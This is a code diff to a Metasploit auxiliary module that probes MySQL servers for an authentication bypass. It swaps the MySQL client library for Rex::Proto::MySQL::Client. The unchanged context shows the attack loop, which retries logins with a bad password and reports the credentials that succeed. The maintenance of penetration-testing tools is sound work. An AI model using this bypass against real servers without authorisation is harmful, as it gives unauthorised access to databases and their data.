@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'rex/proto/mysql/client'
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MYSQL
   include Msf::Auxiliary::Report
@@ -62,16 +64,16 @@ class MetasploitModule < Msf::Auxiliary
     begin
       socket = connect(false)
       close_required = true
-      mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: socket)
+      mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: socket)
       results << mysql_client
       close_required = false
 
       print_good "#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
 
-    rescue ::Mysql::HostNotPrivileged
+    rescue ::Rex::Proto::MySQL::Client::HostNotPrivileged
       print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
       return
-    rescue ::Mysql::AccessDeniedError
+    rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
       print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
     rescue ::Interrupt
       raise $!
@@ -118,12 +120,12 @@ class MetasploitModule < Msf::Auxiliary
             # Create our socket and make the connection
             close_required = true
             s = connect(false)
-            mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: s)
+            mysql_client = ::Rex::Proto::MySQL::Client.connect(rhost, username, password, nil, rport, io: s)
 
             print_good "#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}"
             results << mysql_client
             close_required = false
-          rescue ::Mysql::AccessDeniedError
+          rescue ::Rex::Proto::MySQL::Client::AccessDeniedError
           rescue ::Exception => e
             print_bad "#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}"
           ensure
